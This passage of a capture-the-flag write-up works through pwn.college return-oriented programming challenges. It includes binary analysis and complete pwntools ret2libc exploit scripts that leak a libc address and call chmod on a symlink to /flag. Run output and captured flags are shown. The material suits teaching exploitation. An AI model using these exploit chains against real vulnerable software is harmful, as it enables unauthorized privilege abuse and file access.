Function call setup:
chmod("!", 0o777)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc88 │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403606
rsi: 0x1ff
r15: b"BBBBBBBB"

Function call setup:
chmod("!", 0o777)

═══════════════════════════════════════════════════════════════════════════════════
rip --> chmod("!", 0o777)
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

#### Stage 1: Leaking the address of `puts` within Libc 

Let's perform the first step of the exploit and get the address of `puts` symbol within Libc for that particular execution.
Once we have that, we can calculate the base address of Libc, and then address of the `chmod` symbol within Libc based on the offsets we have found.

```py title="~/script.py" showLineNumbers
from pwn import *
context.arch = 'amd64'

# ROP gadgets
pop_rdi = 0x402223
# PLT entries
puts_plt = 0x401110
# GOT entries
puts_got = 0x405028
# Memory addresses and offsets
offset = 56

p = process('/challenge/putsception-easy')
# --- STAGE 1: Leak address of `puts` within Libc ---
log.info("Sending Stage 2: puts(puts@got)")
payload1 = flat(
    b"A" * offset,

    # puts(puts@got)
    pop_rdi, puts_got,
    puts_plt
)

# Send payload
p.send(payload1)

# Parse the leak
p.recvuntil(b"Leaving!\n")
leak = p.recv(6)
puts_libc = u64(leak.ljust(8, b"\x00"))

print(f"\n[+] puts@libc: {hex(puts_libc)}\n")

p.interactive()
```

```
hacker@return-oriented-programming~putsception-easy:~$ python ~/script.py
[+] Starting local process '/challenge/putsception-easy': pid 1306
[*] Sending Stage 2: puts(puts@got)

[+] puts@libc: 0x7de8e0c53420

[*] Switching to interactive mode

[*] Process '/challenge/putsception-easy' stopped with exit code -11 (SIGSEGV) (pid 1306)
[*] Got EOF while reading in interactive
$  
```

Now we can move onto the full exploit.

#### Stage 2: Using leaked Libc `puts` address to calculate Libc `chmod` address

```
hacker@return-oriented-programming~putsception-easy:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *
context.arch = 'amd64'

# ROP gadgets
pop_rdi = 0x402223
pop_rsi_pop_r15 = 0x402221
# PLT entries
puts_plt = 0x401110
# GOT entries
puts_got = 0x405028
# Memory addresses and offsets
start_func_addr = 0x4011b0
bang_addr = 0x403606
offset = 56

p = process('/challenge/putsception-easy')

# --- STAGE 1: Leak address of `puts` within Libc ---
log.info("Sending Stage 1: puts(puts@got)")
payload1 = flat(
    b"A" * offset,

    # puts(puts@got)
    pop_rdi, puts_got,
    puts_plt,

    # Call _start()
    start_func_addr
)

# Send payload
p.send(payload1)

# Parse the leak
p.recvuntil(b"Leaving!\n")
leak = p.recv(6)
puts_libc = u64(leak.ljust(8, b"\x00"))

# Calculate the address of the Libc entry of chmod
libc_base = puts_libc - 0x84420
chmod_libc = libc_base + 0x10dd80

print(f"\n[+] puts@libc: {hex(puts_libc)}")
print(f"[+] libc_base: {hex(libc_base)}")
print(f"[+] chmod@libc: {hex(chmod_libc)}\n")

# --- STAGE 2: Modify permissions for /flag using symlinks ---
# Wait for the binary to restart and reach the second prompt
p.recvuntil(b"resourceful.") 

log.info("Sending Stage 2: chmod('!', 0o777)")
payload2 = flat(
    b"A" * offset,
    
    # chmod("!", 0o777)
    pop_rdi, bang_addr,      
    pop_rsi_pop_r15, 0o777, b"B" * 8, 
    chmod_libc
)

p.send(payload2)

p.interactive()
```

```
hacker@return-oriented-programming~putsception-easy:~$ python ~/script.py
[+] Starting local process '/challenge/putsception-easy': pid 1702
[*] Sending Stage 1: puts(puts@got)

[+] puts@libc: 0x71d8806e9420
[+] libc_base: 0x71d880665000
[+] chmod@libc: 0x71d880772d80

[*] Sending Stage 2: chmod('!', 0o777)
[*] Switching to interactive mode

What you'd really like to know is the address of libc.
In order to get the address of libc, you'll have to leak it yourself.
An easy way to do this is to do what is known as a `puts(puts)`.
The outer `puts` is puts@plt: this will actually invoke puts, thus initiating a leak.
The inner `puts` is puts@got: this contains the address of puts in libc.
Then you will need to continue executing a new ROP chain with addresses based on that leak.
One easy way to do that is to just restart the binary by returning to its entrypoint.
[*] Process '/challenge/putsception-easy' stopped with exit code 0 (pid 1702)
Received 104 bytes! This is potentially 6 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 7 gadgets of ROP chain at 0x7fffc6ba7028.
| 0x0000000000402223: pop rdi ; ret  ; 
| 0x0000000000403606: and dword ptr [rax], eax ; add dword ptr [rbx], ebx ; add edi, dword ptr [rbx] ; insb byte ptr [rdi], dx ; add byte ptr [rax], al ; add byte ptr [rax + rax], cl ; add byte ptr [rax], al ; sbb dl, bl ; 
| 0x0000000000402221: pop rsi ; pop r15 ; ret  ; 
| 0x00000000000001ff: (UNMAPPED MEMORY)
| 0x4242424242424242: (UNMAPPED MEMORY)
| 0x000071d880772d80: endbr64  ; mov eax, 0x5a ; syscall  ; cmp rax, -0xfff ; jae 0x71d880772d94 ; ret  ; 
| 0x000071d880689083: mov edi, eax ; call 0x71d8806aba40 ; 

Leaving!
[*] Got EOF while reading in interactive
$  
```

```
hacker@return-oriented-programming~putsception-easy:~$ cat /flag 
pwn.college{oLES8Yo4ZJFl1m52C_WB44G-Smt.0VN1MDL4ITM0EzW}
```

&nbsp;

## Putsception (Hard)

```
hacker@return-oriented-programming~putsception-hard:/$ /challenge/putsception-hard 
###
### Welcome to /challenge/putsception-hard!
###

```

Requirements to craft a successful exploit.

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of the PLT entry of `puts@plt`
- [ ] Location of the GOT entry of `puts@got`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

### Binary Analysis

#### `puts@plt` (Procedure Linkage Table entry)

Let's get the address of `puts@plt`.

```
hacker@return-oriented-programming~putsception-hard:/$ objdump -d /challenge/putsception-hard | grep "<puts@plt>:"
0000000000401090 <puts@plt>:
```

- [ ] Offset between buffer and stored return address to `main()`
- [x] Location of the PLT entry of `puts@plt`: `0x401090`
- [ ] Location of the GOT entry of `puts@got`
- [ ] Location of a NULL terminated string:
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

#### `puts@got` (Global Offset Table entry)

```
hacker@return-oriented-programming~putsception-hard:/$ readelf -r /challenge/putsception-hard | grep "puts"
000000405020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
```

- [ ] Offset between buffer and stored return address to `main()`
- [x] Location of the PLT entry of `puts@plt`: `0x401090`
- [x] Location of the GOT entry of `puts@got`: `0x405020`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

#### `_start()`

Lets find the address of `_start()` so that we can call it to run the challenge for the second stage fo the exploit.

```
pwndbg> info address _start
Symbol "_start" is at 0x4010d0 in a file compiled without debugging.
```

- [ ] Offset between buffer and stored return address to `main()`
- [x] Location of the PLT entry of `puts@plt`: `0x401090`
- [x] Location of the GOT entry of `puts@got`: `0x405020`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4010d0`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000402150 <+0>:     endbr64
   0x0000000000402154 <+4>:     push   rbp
   0x0000000000402155 <+5>:     mov    rbp,rsp
   0x0000000000402158 <+8>:     sub    rsp,0x60
   0x000000000040215c <+12>:    mov    DWORD PTR [rbp-0x44],edi
   0x000000000040215f <+15>:    mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000402163 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
   0x0000000000402167 <+23>:    lea    rax,[rbp-0x40]
   0x000000000040216b <+27>:    mov    edx,0x1000
   0x0000000000402170 <+32>:    mov    rsi,rax
   0x0000000000402173 <+35>:    mov    edi,0x0
   0x0000000000402178 <+40>:    call   0x4010b0 <read@plt>
   0x000000000040217d <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000402180 <+48>:    lea    rdi,[rip+0xe7d]        # 0x403004
   0x0000000000402187 <+55>:    call   0x401090 <puts@plt>
   0x000000000040218c <+60>:    nop
   0x000000000040218d <+61>:    leave
   0x000000000040218e <+62>:    ret
End of assembler dump.
```

Set a breakpoint at `challenge+40` and run.

```
pwndbg> break *(challenge+40)
Breakpoint 1 at 0x402178
```

```
pwndbg> run
Starting program: /challenge/putsception-hard 
###
### Welcome to /challenge/putsception-hard!
###


Breakpoint 1, 0x0000000000402178 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
 RAX  0x7fff1ca54290 —▸ 0x78b0c2ab84a0 (_IO_file_jumps) ◂— 0
 RBX  0x402250 (__libc_csu_init) ◂— endbr64 
 RCX  0x7fff1ca543f8 —▸ 0x7fff1ca55675 ◂— '/challenge/putsception-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7fff1ca54290 —▸ 0x78b0c2ab84a0 (_IO_file_jumps) ◂— 0
 R8   0
 R9   0x2c
 R10  0x4004e9 ◂— 0x66756276746573 /* 'setvbuf' */
 R11  0x78b0c2953ce0 (setvbuf) ◂— endbr64 
 R12  0x4010d0 (_start) ◂— endbr64 
 R13  0x7fff1ca543f0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff1ca542d0 —▸ 0x7fff1ca54300 ◂— 0
 RSP  0x7fff1ca54270 ◂— 0
 RIP  0x402178 (challenge+40) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
 ► 0x402178 <challenge+40>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7fff1ca54290 —▸ 0x78b0c2ab84a0 (_IO_file_jumps) ◂— 0
        nbytes: 0x1000
 
   0x40217d <challenge+45>    mov    dword ptr [rbp - 4], eax
   0x402180 <challenge+48>    lea    rdi, [rip + 0xe7d]           RDI => 0x403004 ◂— 'Leaving!'
   0x402187 <challenge+55>    call   puts@plt                    <puts@plt>
 
   0x40218c <challenge+60>    nop    
   0x40218d <challenge+61>    leave  
   0x40218e <challenge+62>    ret    
 
   0x40218f <main>            endbr64 
   0x402193 <main+4>          push   rbp
   0x402194 <main+5>          mov    rbp, rsp
   0x402197 <main+8>          sub    rsp, 0x20
──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fff1ca54270 ◂— 0
01:0008│-058     0x7fff1ca54278 —▸ 0x7fff1ca54408 —▸ 0x7fff1ca55691 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-050     0x7fff1ca54280 —▸ 0x7fff1ca543f8 —▸ 0x7fff1ca55675 ◂— '/challenge/putsception-hard'
03:0018│-048     0x7fff1ca54288 ◂— 0x100000000
04:0020│ rax rsi 0x7fff1ca54290 —▸ 0x78b0c2ab84a0 (_IO_file_jumps) ◂— 0
05:0028│-038     0x7fff1ca54298 —▸ 0x78b0c295d53d (_IO_file_setbuf+13) ◂— test rax, rax
06:0030│-030     0x7fff1ca542a0 —▸ 0x78b0c2abc6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-028     0x7fff1ca542a8 —▸ 0x78b0c2953de5 (setvbuf+261) ◂— xor r8d, r8d
────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x402178 challenge+40
   1         0x402234 main+165
   2   0x78b0c28f3083 __libc_start_main+243
   3         0x4010fe _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Offset between buffer and stored return address to `main()`
   - Location of the buffer: `0x7fff1ca54290`
- [x] Location of the PLT entry of `puts@plt`: `0x401090`
- [x] Location of the GOT entry of `puts@got`: `0x405020`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4010d0`

Now, lets find the location of the stored return address and calculate the offset.

```
pwndbg> info frame
Stack level 0, frame at 0x7fff1ca542e0:
 rip = 0x402178 in challenge; saved rip = 0x402234
 called by frame at 0x7fff1ca54310
 Arglist at 0x7fff1ca542d0, args: 
 Locals at 0x7fff1ca542d0, Previous frame's sp is 0x7fff1ca542e0
 Saved registers:
  rbp at 0x7fff1ca542d0, rip at 0x7fff1ca542d8
```

```
pwndbg> p/d 0x7fff1ca542d8 - 0x7fff1ca54290
$1: 72
```

- [x] Offset between buffer and stored return address to `main()`: `72`
   - Location of the buffer: `0x7fff1ca54290`
   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
- [x] Location of the PLT entry of `puts@plt`: `0x401090`
- [x] Location of the GOT entry of `puts@got`: `0x405020`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4010d0`

Let's find a relevant NULL terminated string.

```
hacker@return-oriented-programming~putsception-hard:/$ objdump -s -j .rodata /challenge/putsception-hard | grep -E "[0-9a-f]{2}00"
 403000 01000200 4c656176 696e6721 00232323  ....Leaving!.###
 403030 2100                                 !.  
```

- [x] Offset between buffer and stored return address to `main()`: `72`
   - Location of the buffer: `0x7fff1ca54290`
   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
- [x] Location of the PLT entry of `puts@plt`: `0x401090`
- [x] Location of the GOT entry of `puts@got`: `0x405020`
- [x] Location of a NULL terminated string: `0x403030`
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4010d0`

#### ROP gadgets

```
hacker@return-oriented-programming~putsception-hard:/$ ROPgadget --binary /challenge/putsception-hard 
Gadgets information
============================================================
0x00000000004010fd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040112b : add bh, bh ; loopne 0x401195 ; nop ; ret
0x00000000004022bc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000402241 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000402242 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040119a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004022be : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004010fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000402243 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040119b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401199 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010fb : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000402244 : add cl, cl ; ret
0x000000000040112a : add dil, dil ; loopne 0x401195 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040119c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401197 : add eax, 0x3ecb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x000000000040218b : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x00000000004011b3 : cli ; jmp 0x401140
0x0000000000401103 : cli ; ret
0x00000000004022cb : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004011b0 : endbr64 ; jmp 0x401140
0x0000000000401100 : endbr64 ; ret
0x000000000040229c : fisttp word ptr [rax - 0x7d] ; ret
0x00000000004010fe : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401125 : je 0x401130 ; mov edi, 0x405050 ; jmp rax
0x0000000000401167 : je 0x401170 ; mov edi, 0x405050 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011b4 : jmp 0x401140
0x000000000040100b : jmp 0x4840104f
0x000000000040112c : jmp rax
0x000000000040218d : leave ; ret
0x000000000040112d : loopne 0x401195 ; nop ; ret
0x0000000000401196 : mov byte ptr [rip + 0x3ecb], 1 ; pop rbp ; ret
0x0000000000402240 : mov eax, 0 ; leave ; ret
0x0000000000401127 : mov edi, 0x405050 ; jmp rax
0x00000000004010ff : nop ; endbr64 ; ret
0x000000000040218c : nop ; leave ; ret
0x0000000000402146 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402147 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402148 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402149 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040214a : nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040214b : nop ; nop ; nop ; pop rbp ; ret
0x000000000040214c : nop ; nop ; pop rbp ; ret
0x000000000040214d : nop ; pop rbp ; ret
0x000000000040112f : nop ; ret
0x00000000004011ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401140
0x0000000000401126 : or dword ptr [rdi + 0x405050], edi ; jmp rax
0x00000000004022ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004022ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004022b0 : pop r14 ; pop r15 ; ret
0x00000000004022b2 : pop r15 ; ret
0x00000000004022ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004022af : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040119d : pop rbp ; ret
0x00000000004022b3 : pop rdi ; ret
0x00000000004022b1 : pop rsi ; pop r15 ; ret
0x00000000004022ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401129 : push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
0x0000000000401128 : push rax ; push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
0x000000000040101a : ret
0x0000000000401198 : retf
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x00000000004022cd : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004022cc : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401123 : test eax, eax ; je 0x401130 ; mov edi, 0x405050 ; jmp rax
0x0000000000401165 : test eax, eax ; je 0x401170 ; mov edi, 0x405050 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 78
```

- [x] Offset between buffer and stored return address to `main()`: `72`
   - Location of the buffer: `0x7fff1ca54290`
   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
- [x] Location of the PLT entry of `puts@plt`: `0x401090`
- [x] Location of the GOT entry of `puts@got`: `0x405020`
- [x] Location of a NULL terminated string: `0x403030`
- [ ] Offsets of required Libc functions
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x4022b3`
   - `pop rsi ; pop r15 ; ret`: `0x4022b1`
- [x] Address of `_start()`: `0x4010d0`

#### Libc functions

Lets find the offset of the relevant functions within Libc.

```
hacker@return-oriented-programming~putsception-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "puts"
   195: 0000000000084420   476 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
   505: 0000000000124550  1268 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
   692: 0000000000126220   728 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
  1160: 0000000000082ce0   384 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
```

```
hacker@return-oriented-programming~putsception-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
```

- [x] Offset between buffer and stored return address to `main()`: `72`
   - Location of the buffer: `0x7fff1ca54290`
   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
- [x] Location of the PLT entry of `puts@plt`: `0x401090`
- [x] Location of the GOT entry of `puts@got`: `0x405020`
- [x] Location of a NULL terminated string: `0x403030`
- [x] Offsets of required Libc functions
    - Offset of the `puts` symbol within Libc: `0x84420`
    - Offset of the `chmod` symbol within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x4022b3`
   - `pop rsi ; pop r15 ; ret`: `0x4022b1`
- [x] Address of `_start()`: `0x4010d0`

### ROP chain: ret2libc

The ROP chain in this version would be the same as the [easy version](#rop-chain-ret2libc-2).

### Exploit

```
hacker@return-oriented-programming~putsception-hard:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *
context.arch = 'amd64'

# ROP gadgets
pop_rdi = 0x4022b3
pop_rsi_pop_r15 = 0x4022b1
# PLT entries
puts_plt = 0x401090
# GOT entries
puts_got = 0x405020
# Memory addresses and offsets
start_func_addr = 0x4010d0
bang_addr = 0x403030
offset = 72

p = process('/challenge/putsception-hard')

# --- STAGE 1: Leak address of `puts` within Libc ---
log.info("Sending Stage 1: puts(puts@got)")
payload1 = flat(
    b"A" * offset,

    # puts(puts@got)
    pop_rdi, puts_got,
    puts_plt,

    # Call _start()
    start_func_addr
)

# Send payload
p.send(payload1)

# Parse the leak
p.recvuntil(b"Leaving!\n")
leak = p.recv(6)
puts_libc = u64(leak.ljust(8, b"\x00"))

# Calculate the address of the Libc entry of chmod
libc_base = puts_libc - 0x84420
chmod_libc = libc_base + 0x10dd80

print(f"\n[+] puts@libc: {hex(puts_libc)}")
print(f"[+] libc_base: {hex(libc_base)}")
print(f"[+] chmod@libc: {hex(chmod_libc)}\n")

# --- STAGE 2: CHMOD ---
log.info("Sending Stage 2: chmod('!', 0o777)")
payload2 = flat(
    b"A" * offset,
    
    # chmod("!", 0o777)
    pop_rdi, bang_addr,      
    pop_rsi_pop_r15, 0o777, b"B" * 8, 
    chmod_libc
)

p.send(payload2)

p.interactive()
```

```
hacker@return-oriented-programming~putsception-hard:~$ python ~/script.py
[+] Starting local process '/challenge/putsception-hard': pid 8385
[*] Sending Stage 1: puts(puts@got)

[+] puts@libc: 0x7147bcb0a420
[+] libc_base: 0x7147bca86000
[+] chmod@libc: 0x7147bcb93d80

[*] Sending Stage 2: chmod('!', 0o777)
[*] Switching to interactive mode

###
### Welcome to (null)!
###

[*] Process '/challenge/putsception-hard' stopped with exit code 0 (pid 8385)
Leaving!
[*] Got EOF while reading in interactive
$
```

```
hacker@return-oriented-programming~putsception-hard:~$ cat /flag 
pwn.college{08FHECJ2yZ8oCwu4qXEb4515eSO.0lN1MDL4ITM0EzW}
```

&nbsp;

## Pivotal Prelude (Easy)

```
hacker@return-oriented-programming~pivotal-prelude-easy:/$ /challenge/pivotal-prelude-easy 
###
### Welcome to /challenge/pivotal-prelude-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

This challenge doesn't give you much to work with, so you will have to be resourceful.
What you'd really like to know is the address of libc.
In order to get the address of libc, you'll have to leak it yourself.
An easy way to do this is to do what is known as a `puts(puts)`.
The outer `puts` is puts@plt: this will actually invoke puts, thus initiating a leak.
The inner `puts` is puts@got: this contains the address of puts in libc.
Then you will need to continue executing a new ROP chain with addresses based on that leak.
One easy way to do that is to just restart the binary by returning to its entrypoint.
Previous challenges let you write your ROP chain directly onto the stack.
This challenge is not so nice!
Your input will be read to the .bss, and only a small part of it will be copied to the stack.
You will need to figure out how to use stack pivoting to execute your full ropchain!

```

Let's pass some input and see how much of it is copied to the stack.

```
hacker@return-oriented-programming~pivotal-prelude-easy:/$ /challenge/pivotal-prelude-easy 
###
### Welcome to /challenge/pivotal-prelude-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

This challenge doesn't give you much to work with, so you will have to be resourceful.
What you'd really like to know is the address of libc.
In order to get the address of libc, you'll have to leak it yourself.
An easy way to do this is to do what is known as a `puts(puts)`.
The outer `puts` is puts@plt: this will actually invoke puts, thus initiating a leak.
The inner `puts` is puts@got: this contains the address of puts in libc.
Then you will need to continue executing a new ROP chain with addresses based on that leak.
One easy way to do that is to just restart the binary by returning to its entrypoint.
Previous challenges let you write your ROP chain directly onto the stack.
This challenge is not so nice!
Your input will be read to the .bss, and only a small part of it will be copied to the stack.
You will need to figure out how to use stack pivoting to execute your full ropchain!
aaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbb
Received 43 bytes! This is potentially 5 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 5 gadgets of ROP chain at 0x4150e0.
| 0x6161616161616161: (UNMAPPED MEMORY)
| 0x6261616161616161: (UNMAPPED MEMORY)
| 0x6262626262626262: (UNMAPPED MEMORY)
| 0x6262626262626262: (UNMAPPED MEMORY)
| 0x6262626262626262: (UNMAPPED MEMORY)

Of course, only 24 bytes of the above ropchain was copied to the stack!
Let's take a look at just that part of the chain. To execute the rest, you'll have to pivot the stack!

+--- Printing 3 gadgets of ROP chain at 0x7ffefc892a08.
| 0x6161616161616161: (UNMAPPED MEMORY)
| 0x6261616161616161: (UNMAPPED MEMORY)
| 0x6262626262626262: (UNMAPPED MEMORY)

Leaving!
Segmentation fault         /challenge/pivotal-prelude-easy
```

So the first 24 bytes from our user input are copied from the `.bss` location to the stack. That means we can only execute 3 ROP gadgets. 
We can try to use a very lean exploit to fit the limitation, or we can perform a stack pivot and obtain more room for our ROP gadgets.
In this challenge, we will go with the latter approach.


We need the following in order to craft the exploit:
- [ ] Location of the PLT entry of `puts@plt`
- [ ] Location of the GOT entry of `puts@got`
- [ ] Location of the unexecuted ROP chain within BSS
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

### Binary Analysis

We already know the location in the BSS to which our ROP payload is saved based on the program's output.

- [ ] Location of the PLT entry of `puts@plt`
- [ ] Location of the GOT entry of `puts@got`
- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0 + 16` (Because we do not want to execute the first two gadgets again in the BSS.)
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

#### `puts@plt` (Procedure Linkage Table entry)

```
hacker@return-oriented-programming~pivotal-prelude-easy:/$ objdump -d /challenge/pivotal-prelude-easy | grep "<puts@plt>:"
0000000000401120 <puts@plt>:
```

- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
- [ ] Location of the GOT entry of `puts@got`
- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

#### `puts@got` (Global Offset Table entry)

```
hacker@return-oriented-programming~pivotal-prelude-easy:/$ readelf -r /challenge/pivotal-prelude-easy | grep "puts"
000000405028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
```

- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

#### `_start()`

We need find this address so the we can can invoke the program again to execute our second stage of payload.

```
pwndbg> info address _start 
Symbol "_start" is at 0x4011d0 in a file compiled without debugging.
```

- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4011d0`

#### ROP gadgets

Now, we need to find the relevent ROP gadgets, and their addresses.

```
hacker@return-oriented-programming~pivotal-prelude-easy:/$ ROPgadget --binary /challenge/pivotal-prelude-easy
Gadgets information
============================================================
0x000000000040232d : adc al, 0 ; add al, ch ; jmp 0x402320
0x00000000004016a7 : adc eax, 0xc9fffffb ; ret
0x00000000004011fd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040232f : add al, ch ; jmp 0x402320
0x000000000040122b : add bh, bh ; loopne 0x401295 ; nop ; ret
0x0000000000402143 : add byte ptr [rax + 0x29], cl ; ret 0x8948
0x000000000040158f : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401628
0x0000000000401524 : add byte ptr [rax - 0x77], cl ; iretd
